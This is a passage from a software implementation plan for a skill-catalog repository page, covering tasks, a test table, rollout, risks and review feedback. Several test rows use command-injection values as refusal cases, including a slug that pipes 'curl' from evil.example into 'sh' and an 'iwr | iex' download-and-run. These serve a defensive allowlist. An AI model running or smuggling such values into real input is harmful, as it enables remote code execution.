     on a plain left click, so the row stays a real link.
  4. Specs render inside `MemoryRouter` and mock `@shared` with a
     `vi.importActual` spread, so `buildInstallCommand` and
     `BackendApiError` stay real.
- **Done when:** `npx vitest run client/src/App.spec.tsx client/src/components/RepositoryList/RepositoryList.spec.tsx`
  passes, `npm run test:run` passes, `npm run typecheck` reports no errors,
  and `npx eslint <changed files>` is clean.

### T-9: Cover the journey end to end

- **Package:** e2e
- **Depends on:** T-8
- **Covers:** FR-1, FR-2, FR-3, FR-4, FR-6, BR-4, BR-7, NFR-1, AC-1, AC-2, AC-3, AC-4, AC-10, AC-12, AC-13
- **Files:** `e2e/support/firestore.ts` (modify),
  `e2e/repository-details.e2e.ts` (**new**)
- **Steps:**
  1. Make `seedRepositories` return the ids, and add `trackInstalls` (see
     **Changes by package**).
  2. Seed `REPOSITORY_FIXTURES`, and give `dosandk/SkillStack` installs with
     `trackInstalls`: `code-review` 3 times and `git-commit` once, so the
     expected order is `code-review` 3, `git-commit` 1, `eleks-ui` 0.
     Descriptions come from `githubServiceMock` (`Description of <name>`).
  3. Follow `e2e/repository-list.e2e.ts`: `waitUntil: 'domcontentloaded'`,
     selectors by `data-testid`. For the clipboard, grant `clipboard-read`
     and `clipboard-write`, then read with `navigator.clipboard.readText()`
     and expect
     `npx skillstack-cli add https://github.com/dosandk/SkillStack --skill code-review`;
     that text must not be visible on the page. For AC-13, warm the endpoint
     with a node-side `fetch` first, then assert `skill-list` is visible
     within 2000 ms of the click.
- **Done when:** `npx eslint e2e/repository-details.e2e.ts e2e/support/firestore.ts`
  is clean. With `verification=full`, `npm run test:e2e` passes, including
  the existing `e2e/repository-list.e2e.ts`.

## Test plan

| Test | Level | File | Task | Covers |
| ---- | ----- | ---- | ---- | ------ |
| should list every skill of a repository with its install count | Unit | `functions/src/services/repositories-store.spec.ts` | T-1 | FR-7 |
| should report 0 installs for a skill document without an installCount | Unit | `functions/src/services/repositories-store.spec.ts` | T-1 | BR-2, AC-9 |
| should return the repository with its skills and install counts | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | FR-7, AC-2 |
| should sort skills by install count, highest first | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | FR-3, AC-3 |
| should order skills with equal install counts alphabetically by name | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | BR-3, AC-3 |
| should list a skill from the skills array with 0 installs when it has no skill document | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | BR-2, AC-9 |
| should list a skill that exists only as a skill document | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | FR-2 |
| should list a skill once when it is in both the array and the subcollection | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | FR-2 |
| should return null when the repository does not exist | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | BR-4, AC-10 |
| should reject a missing, empty or slash-containing id without reading Firestore | Unit | `functions/src/functions/get-repository-details/function.spec.ts` (**new**) | T-2 | BR-4 |
| should return 200 with the repository and its skills sorted by install count | Integration | `functions/src/integration-specs/get-repository-details.i.spec.ts` (**new**) | T-2 | FR-3, FR-7, AC-2, AC-3 |
| should return 404 for an unknown repository id | Integration | `functions/src/integration-specs/get-repository-details.i.spec.ts` (**new**) | T-2 | BR-4, AC-10 |
| should return 400 when the id is missing | Integration | `functions/src/integration-specs/get-repository-details.i.spec.ts` (**new**) | T-2 | BR-4 |
| should request apiGetRepositoryDetails with the URL-encoded id and return the body | Unit | `shared/firebase-cloude-api/index.spec.ts` (**new**) | T-3 | FR-7 |
| should throw a BackendApiError with status 404 when the repository is not found | Unit | `shared/firebase-cloude-api/index.spec.ts` (**new**) | T-3 | BR-4, AC-10 |
| should build the npx skillstack-cli add command with the GitHub URL and skill name | Unit | `shared/utils/build-install-command.spec.ts` (**new**) | T-4 | FR-4, BR-7, AC-4 |
| should use a repository URL that parseRepoPath accepts | Unit | `shared/utils/build-install-command.spec.ts` (**new**) | T-4 | BR-7, AC-4 |
| should keep the skill name exactly as given when it only has safe characters | Unit | `shared/utils/build-install-command.spec.ts` (**new**) | T-4 | BR-7 |
| ~~should single-quote a skill name with shell-unsafe characters~~ (removed in r3: D-7 no longer quotes, R-1) | — | — | — | — |
| should return null for a repository slug with shell metacharacters (`acme/tools;curl -s https://evil.example/x\|sh;#`) | Unit | `shared/utils/build-install-command.spec.ts` (**new**) | T-4 | FR-4, BR-7 |
| should return null for a skill name outside the allowlist (`x'; iwr evil \| iex; '`, `my skill; ls`, `it's`) | Unit | `shared/utils/build-install-command.spec.ts` (**new**) | T-4 | FR-4, BR-7 |
| should accept GitHub owner/repo slugs (`octocat/hello-world`, `octocat/.github`, `acme-labs/my_repo.v2`) | Unit | `shared/utils/safe-names.spec.ts` (**new**) | T-4 | BR-7 |
| should refuse a slug that is not exactly owner/repo or has a character outside the allowlist (empty, `acme`, `acme/a/b`, `acme/.`, `acme/..`, `ac.me/x`, `acme/x y`, `acme/x;id`, `acme/x&id`, `acme/x\|id`, `acme/x$(id)`, `` acme/x`id` ``, `acme/x%PATH%`, `acme/x^y`, `acme/x,y`, `acme/x'y`, `acme/x"y`, `acme/x` + newline + `id`) | Unit | `shared/utils/safe-names.spec.ts` (**new**) | T-4 | BR-7 |
| should accept a plain skill name (`code-review`, `My_skill-2.v1`, `2fa`) | Unit | `shared/utils/safe-names.spec.ts` (**new**) | T-4 | BR-7 |
| should refuse a skill name with a character outside the allowlist or a leading `-` or `.` (empty, `-rf`, `.hidden`, `..`, `a b`, `a/b`, `a;b`, `a&b`, `a\|b`, `$x`, `a'b`, `a"b`, `` a`b ``, `a%b`, `a^b`, `a,b`, `a` + newline + `b`) | Unit | `shared/utils/safe-names.spec.ts` (**new**) | T-4 | BR-7 |
| should read a single-line description from the frontmatter | Unit | `shared/utils/parse-skill-description.spec.ts` (**new**) | T-4 | FR-2 |
| should unquote a quoted description | Unit | `shared/utils/parse-skill-description.spec.ts` (**new**) | T-4 | FR-2 |
| should join a folded block description into one line | Unit | `shared/utils/parse-skill-description.spec.ts` (**new**) | T-4 | FR-2 |
| should return undefined when the file has no frontmatter | Unit | `shared/utils/parse-skill-description.spec.ts` (**new**) | T-4 | BR-1, AC-8 |
| should return undefined when the frontmatter has no description | Unit | `shared/utils/parse-skill-description.spec.ts` (**new**) | T-4 | BR-1, AC-8 |
| should map each skill name to the description of its SKILL.md | Unit | `shared/github-api/get-skill-descriptions.spec.ts` (**new**) | T-5 | FR-2, AC-2 |
| should match a SKILL.md nested under a directory named after the skill | Unit | `shared/github-api/get-skill-descriptions.spec.ts` (**new**) | T-5 | FR-2 |
| should omit a skill that has no SKILL.md | Unit | `shared/github-api/get-skill-descriptions.spec.ts` (**new**) | T-5 | BR-1, AC-8 |
| should omit a skill whose blob request fails and keep the others | Unit | `shared/github-api/get-skill-descriptions.spec.ts` (**new**) | T-5 | BR-1, BR-8 |
| should not call GitHub when no skill names are given | Unit | `shared/github-api/get-skill-descriptions.spec.ts` (**new**) | T-5 | FR-2 |
| should reject with a GithubApiError when the tree request is rate-limited | Unit | `shared/github-api/get-skill-descriptions.spec.ts` (**new**) | T-5 | BR-8, AC-15 |
| should reject an unsafe repository slug without calling GitHub (`acme/tools;curl -s https://evil.example/x\|sh;#`, `acme/../x`) | Unit | `shared/github-api/get-skill-descriptions.spec.ts` (**new**) | T-5 | BR-8 |
| should render each skill's name, description and install count | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | FR-2, AC-2 |
| should render a skill without a description | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | BR-1, AC-8 |
| should show 0 installs for a skill with no installs | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | BR-2, AC-9 |
| should copy the clicked skill's install command and confirm it | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | FR-4, BR-5, BR-7, AC-4 |
| should not display the install command text on the page | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | FR-4, AC-4 |
| should report the failure and show the full command when the clipboard write fails | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | BR-5, AC-11 |
| should report the failure when the clipboard API is unavailable | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | BR-5, AC-11 |
| should not copy anything and report the refusal without a command for an unsafe skill name (`x'; iwr evil \| iex; '`) | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | FR-4, BR-5, BR-7 |
| should not copy anything and report the refusal without a command for an unsafe repository slug (`acme/tools;curl -s https://evil.example/x\|sh;#`) | Unit | `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**) | T-6 | FR-4, BR-5, BR-7 |
| should return null when the backend answers 404 | Unit | `client/src/lib/api.spec.ts` (**new**) | T-7 | BR-4, AC-10 |
| should rethrow a backend error other than 400 or 404 | Unit | `client/src/lib/api.spec.ts` (**new**) | T-7 | FR-5, AC-7 |
| should resolve to no descriptions when GitHub rejects | Unit | `client/src/lib/api.spec.ts` (**new**) | T-7 | BR-8, AC-15 |
| should show a loading state while the repository is loading | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | FR-5, AC-5 |
| should show the repository name, owner and a link back to the catalog | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | FR-6, AC-12 |
| should list the skills with their GitHub descriptions and install counts | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | FR-2, FR-7, AC-2 |
| should show names and install counts while descriptions are still loading | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | NFR-1, BR-8 |
| should keep the skill order returned by the backend | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | FR-3, AC-3 |
| should list the skills without descriptions and no error state when GitHub fails | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | BR-1, BR-8, AC-8, AC-15 |
| should show an empty state when the repository has no skills | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | FR-5, AC-6 |
| should show an error state when the request fails | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | FR-5, AC-7 |
| should show a not-found state when the repository does not exist | Unit | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**) | T-7 | BR-4, AC-10 |
| should link each repository to its own page | Unit | `client/src/components/RepositoryList/RepositoryList.spec.tsx` (**new**) | T-8 | FR-1, AC-1 |
| should open the repository page when a repository is clicked | Unit | `client/src/App.spec.tsx` (**new**) | T-8 | FR-1, AC-1 |
| should show the catalog after leaving a repository page that failed to load | Unit | `client/src/App.spec.tsx` (**new**) | T-8 | BR-6, AC-7 |
| should redirect an unknown address to the catalog | Unit | `client/src/App.spec.tsx` (**new**) | T-8 | FR-1 |
| should open a repository's page from the catalog at its own address | E2E | `e2e/repository-details.e2e.ts` (**new**) | T-9 | FR-1, FR-6, AC-1, AC-12 |
| should list the skills with descriptions, highest install count first | E2E | `e2e/repository-details.e2e.ts` (**new**) | T-9 | FR-2, FR-3, AC-2, AC-3 |
| should copy the npx skillstack-cli install command without showing it on the page | E2E | `e2e/repository-details.e2e.ts` (**new**) | T-9 | FR-4, BR-7, AC-4 |
| should show a not-found state for an unknown repository address | E2E | `e2e/repository-details.e2e.ts` (**new**) | T-9 | BR-4, AC-10 |
| should show the skills within 2 seconds of opening the page | E2E | `e2e/repository-details.e2e.ts` (**new**) | T-9 | NFR-1, AC-13 |
| page matches the catalog: same `Container`/`Heading`, `List` rows, outlined primary `Chip`, 4 `Skeleton` rows, states centered with `py: 6` | Review | — | T-6, T-7 | NFR-2, AC-14 |

Notes for the test-writer:

- `@testing-library/user-event`'s `setup()` replaces `navigator.clipboard`
  with its own stub. Stub the clipboard after `setup()`, or assert through
  that stub.
- In the client project `import.meta.env.DEV` is on, so a real `@shared`
  import loads `githubServiceMock`. Mock `githubService.getSkillDescriptions`
  explicitly.
- AC-15 has no e2e case: in e2e the dev mock always returns descriptions, so
  the GitHub failure path is covered by the T-5 and T-7 unit tests.
- (r3, R-1) The refusal rows replace the two quoting cases (TC-28, TC-29).
  The `SkillList` refusal tests render `SkillList` directly with the unsafe
  `repoSlug` or skill name. They assert that `navigator.clipboard.writeText`
  is never called, that `copy-feedback` reads "Could not build a safe
  install command for this skill.", and that `document.body` contains no
  `npx skillstack-cli` and no `https://github.com/`. The refusal has no e2e
  case: the e2e fixtures are safe names, and TC-91 still pins the safe path.
- (r3) Every existing safe-input case stays as it is: TC-25..TC-27, TC-51,
  TC-53, TC-54 and TC-91 use names that pass the allowlist.

## Rollout

1. Deploy `functions/` first (`cd functions; npm run deploy`, gated by
   `test:all`), so `apiGetRepositoryDetails` exists before the client calls
   it. Hosting deploys on merge to `main` (`.github/workflows/firebase-hosting-merge.yml`).
2. There are no Firestore document, index or rules changes, and no migration
   or backfill.
3. CLI: no code change. Installed CLI versions call only unchanged endpoints,
   and the shared additions get bundled into the next CLI build without
   changing its behavior. For BR-7, before or together with the hosting
   release, a maintainer publishes a `skillstack-cli` that contains `add`:
   bump the version in `cli/package.json`, set the production `BACKEND_URL`
   in `cli/.env`, run `npm run build` and `npm publish` in `cli/`, then check
   that `npx skillstack-cli@latest add --help` lists `--skill` (A-5, PG-5).
   Stage agents do not publish.
4. Run `npm install` at the root before building or testing.
   `react-router-dom` is already in `package.json` and `package-lock.json`,
   so no new dependency is added.

## Risks

- **Unpublished `add` command.** Until **Rollout** step 3 is done, the copied
  command downloads `skillstack-cli@0.0.2`, which has no `add`, and fails
  with an unknown-command error (PG-5). `npx` also asks to confirm the
  download on first use, and later runs whatever version npm resolves, so a
  future breaking CLI release would break the copied command too.
- **GitHub rate limit.** Unauthenticated browser calls get 60 requests per
  hour per IP, and the production build sets no `GITHUB_TOKEN`. Each page
  view costs 1 + N requests (N = skills with a `SKILL.md`), so heavy browsing
  loses its descriptions. BR-8 accepts this; persisting descriptions would
  fix it but is a spec non-goal.
- **Description lookup.** The `SKILL.md` match is a heuristic. Two
  directories with the same skill name pick the first in tree order, and a
  truncated tree (`truncated: true`) can miss files. The minimal frontmatter
  parser ignores exotic YAML (anchors, flow mappings).
- ~~**Shell quoting.**~~ (removed in r3: D-7 no longer quotes; R-1 showed
  the `'\''` escape was a shell-injection path in PowerShell and cmd, not
  only a usability issue.)
- **Refused install commands** (D-7, A-6). A repository or skill whose
  stored name fails the allowlist gets no copyable command. What the real
  write paths store passes: the CLI stores GitHub's `full_name`, GitHub
  repo names and personal or organization logins use only the allowed
  characters, and the seed script and the e2e fixtures use `[A-Za-z0-9-]`
  names. Refused as well: Enterprise Managed User logins, which contain
  `_`, and skill names with a space, a non-ASCII letter, or a leading `.`
  or `-`. PG-6 asks the spec to confirm this.
- **Unvalidated writes stay open.** `apiStoreRepoInfo` and
  `apiTrackSkillsInstall` still accept any slug and skill name, so junk
  repositories and skill rows can still appear in the catalog and on the
  page. They are shown as plain text and can no longer reach a shell or a
  GitHub path. Tightening `repositorySchema` (with a backfill check for
  stored documents, ADR-007) is follow-up work for a separate issue. The
  human direction for this round limits the fix to R-1.
- **Whole-repo install.** The CLI's `--skill` only drives install tracking:
  `add` downloads every repo file up to depth 3 whatever the skill. The
  copied command works, but it installs more than one skill. This is existing
  behavior, and CLI changes are a spec non-goal.
- **Router typing.** The ELEKS wrappers' props (`ListItemButton`, `Link`) may
  reject react-router's `to` with `component`. T-8 step 3 names the fallback.
- **Routing change.** Unknown paths now redirect to `/` instead of rendering
  the catalog in place. The result is the same for users.

## Gaps

- **PG-5** (non-blocking, spec, BR-7, AC-4): the copied
  `npx skillstack-cli add …` runs the latest `skillstack-cli` on npm, which
  is `0.0.2`. Its published `dist/bin.js` defines only `push` and `pull`, so
  pasting the command today fails with an unknown-command error, and BR-7's
  "works as is" does not hold. `add` exists only in the repo (commit
  `3ed3c68`, after the 0.0.2 publish). The plan needs no CLI code change and
  lists the release as a manual rollout step (A-5). Suggested: add to the
  spec a release dependency that a `skillstack-cli` version with `add`,
  built against the production backend, is published to npm before or with
  this page, and name who publishes it.
- **PG-6** (non-blocking, spec, FR-4, BR-5, BR-7; new in r3, R-1): the spec
  does not say what the copy button does when a stored repository slug or
  skill name cannot form a command that is safe to paste. Such names can be
  stored, because `apiStoreRepoInfo` and `apiTrackSkillsInstall` are public
  and accept any string, and FR-4 hides the command, so the user cannot
  inspect it. The plan follows A-6 and the allowlist in D-7. Suggested: add
  a business rule and an acceptance criterion. The copied command contains
  only characters that are literal when unquoted in bash, zsh, PowerShell
  and cmd. For a repository or skill whose stored name has anything else,
  the button copies nothing, and the user is told the command could not be
  built, without being shown it.

### Resolved

- **PG-1**: resolved by human decision in spec r2 (FR-4, BR-7, AC-4 use
  `npx skillstack-cli add <repo-url> --skill <name>`); applied in plan r2.
- **PG-2**: resolved by human decision in spec r2 (BR-8, AC-15, best-effort
  browser-side descriptions); applied in plan r2.
- **PG-3**: resolved by human decision in spec r2 (NFR-1, AC-13: 2 s for
  names and install counts, up to 50 skills, warm backend); applied in plan
  r2.
- **PG-4**: resolved by human decision in spec r2 (FR-4, BR-5, AC-11: button
  only, command text in the failure message); applied in plan r2.

## Feedback

- **PG-1** (human decision): applied. D-7, the `buildInstallCommand` contract,
  T-4, T-9 and the test names now use
  `npx skillstack-cli add <repo-url> --skill <name>`; ~~A-4~~ removed.
  Checking this prefix against the npm registry raised PG-5.
- **PG-2** (human decision): applied. D-4 is kept and now cites BR-8;
  ~~A-1~~ removed. BR-8 and AC-15 are covered by T-5 and T-7, with new tests
  in `client/src/lib/api.spec.ts` and `RepositoryDetails.spec.tsx`.
- **PG-3** (human decision): applied. ~~A-2~~ removed, since NFR-1 now states
  the target. T-7 keeps names and counts independent of descriptions (new
  test), and T-9 measures AC-13.
- **PG-4** (human decision): applied. ~~A-3~~ removed, since FR-4 and BR-5 now
  state it. T-6 and T-9 also check that the command text is not shown on the
  page.
- **R-1** (review.md r1, blocker): applied in r3. D-7 now uses an allowlist
  instead of quoting, and `buildInstallCommand` returns `null` for refused
  input. The new D-11 checks the slug in `getSkillDescriptions` before any
  GitHub path is built, and the new A-6 defines the refusal message. The new
  `shared/utils/safe-names.ts` holds both rules. T-4, T-5 and T-6 are
  reopened, and their r3 steps are marked. The Test plan replaces the two
  quoting cases (TC-28, TC-29) with refusal cases and adds a malicious
  `repoSlug` case for the helper, the gateway and the component. PG-6 asks
  the spec to record the refusal rule. The reviewer's suggested
  `repositorySchema` tightening is listed under **Risks** as follow-up work,
  not as a task.
- **R-2..R-7** (review.md r1; human direction at the review r1 gate: "Fix
  only the blocker R-1 … leave the minors as recorded"): not acted on in
  r3. They stay recorded in `review.md`. R-5 targets this plan, so the
  `client/src/lib/api.spec.ts` path in T-7 and the Test plan, and TG-1..TG-3,
  are left as in r2 on purpose.
